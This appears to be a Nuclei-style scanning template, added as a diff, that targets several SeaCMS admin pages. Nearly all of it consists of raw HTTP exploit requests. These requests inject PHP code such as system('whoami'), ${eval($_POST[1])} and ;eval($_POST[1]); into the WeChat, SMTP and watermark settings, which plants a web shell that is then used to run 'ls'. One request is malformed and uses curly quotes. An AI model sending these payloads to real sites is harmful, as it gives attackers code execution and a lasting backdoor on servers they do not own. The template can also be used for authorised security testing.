@@ -1,0 +1,250 @@
+id: poc-hf6g50qwb4f2w25n
+info:
+  name: SeaCMS海洋影视管理系统多个漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hf6g50qwb4f2w25n'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hf6g50qwb4f2w25n
+    fofa: body="http://www.seacms.net"
+http:
+- raw:
+  - 'POST /at1fcg/admin_weixin.php?action=set HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 1174
+
+    Origin: [http://127.0.0.12](http://127.0.0.12)
+
+    Connection: close
+
+    Referer: [http://127.0.0.12/at1fcg/admin_weixin.php](http://127.0.0.12/at1fcg/admin_weixin.php)
+
+    Cookie: PHPSESSID=rcejd2jps1jcrv8gdoumqmf71k
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: iframe
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-User: ?1
+
+    Priority: u=4
+
+    isopen=n&url=https%3A%2F%2Fwww.seacms.net&title=%E6%B5%B7%E6%B4%8B%E5%BD%B1%E8%A7%86&ckmov_url=https%3A%2F%2Fwww.seacms.net%2Fvip.php%3Furl%3D+&dpic=https%3A%2F%2Fwww.seacms.net%2Fapi%2Fwx.jpg&follow=%E6%84%9F%E8%B0%A2%E6%82%A8%E7%9A%84%E5%85%B3%E6%B3%A8%E3%80%82&noc=%E6%9A%82%E6%97%A0%E4%BD%A0%E8%A6%81%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82&help=%E8%BF%99%E6%98%AF%E5%B8%AE%E5%8A%A9%E4%BF%A1%E6%81%AF%E3%80%82&topage=d&dwz=n&dwztoken=dwztoken&sql_num=15&msg1a=");system(''whoami'');//&msg1b=%E5%85%B3%E9%94%AE%E8%AF%8D%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%86%85%E5%AE%B91&msg2a=%E5%85%B3%E9%94%AE%E8%AF%8D2&msg2b=%E5%85%B3%E9%94%AE%E8%AF%8D%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%86%85%E5%AE%B92%3Ca+href%3D%27http%3A%2F%2Fwww.seacms.net%27%3E%E9%93%BE%E6%8E%A5%E6%B5%8B%E8%AF%95%3C%2Fa%3E%EF%BC%8C%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9D%9F%E3%80%82&msg3a=%E5%85%B3%E9%94%AE%E8%AF%8D3&msg3b=%E5%85%B3%E9%94%AE%E8%AF%8D%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%86%85%E5%AE%B93&msg4a=%E5%85%B3%E9%94%AE%E8%AF%8D4&msg4b=%E5%85%B3%E9%94%AE%E8%AF%8D%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%86%85%E5%AE%B94&msg5a=%E5%85%B3%E9%94%AE%E8%AF%8D5&msg5b=%3Ca+href%3D%27https%3A%2F%2Fwww.seacms.net%27%3E%E9%93%BE%E6%8E%A5%3C%2Fa%3E'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /at1fcg/admin_smtp.php?action=set HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 192
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Connection: close
+
+    Referer: [http://127.0.0.1/at1fcg/admin_smtp.php](http://127.0.0.1/at1fcg/admin_smtp.php)
+
+    Cookie: PHPSESSID=rcejd2jps1jcrv8gdoumqmf71k
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: iframe
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-User: ?1
+
+    Priority: u=4
+
+    smtpserver=${eval($_POST[1])}&smtpserverport=&smtpusermail=12345%40qq.com&smtpname=%E6%B5%B7%E6%B4%8B%E5%BD%B1%E8%A7%86%E7%BD%91&smtpuser=12345%40qq.com&smtppass=123456789&smtpreg=off&smtppsw='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /data/admin/smtp.php HTTP/1.1
+
+    1=system(‘ls’);'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /at1fcg/admin_config_mark.php?dopost=save HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: multipart/form-data; boundary=---------------------------146825793124702915421087120454
+
+    Content-Length: 1841
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Connection: close
+
+    Referer: [http://127.0.0.1/at1fcg/admin_config_mark.php](http://127.0.0.1/at1fcg/admin_config_mark.php)
+
+    Cookie: PHPSESSID=rcejd2jps1jcrv8gdoumqmf71k
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: iframe
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-User: ?1
+
+    Priority: u=4
+
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_markimg"
+
+
+    mark.gif
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_markup"
+
+
+    0
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_markdown"
+
+
+    0
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_marktype"
+
+
+    1
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_wwidth"
+
+
+    100
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_wheight"
+
+
+    100
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="newimg"; filename=""
+
+    Content-Type: image/png
+
+
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_watertext"
+
+
+    www.seacms.net''
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_fontsize"
+
+
+    ;eval($_POST[1]);
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_fontcolor"
+
+
+    ;#FF0000
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_marktrans"
+
+
+    100
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_diaphaneity"
+
+
+    100
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="photo_waterpos"
+
+
+    1
+
+    -----------------------------146825793124702915421087120454
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    确定提交
+
+    -----------------------------146825793124702915421087120454--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
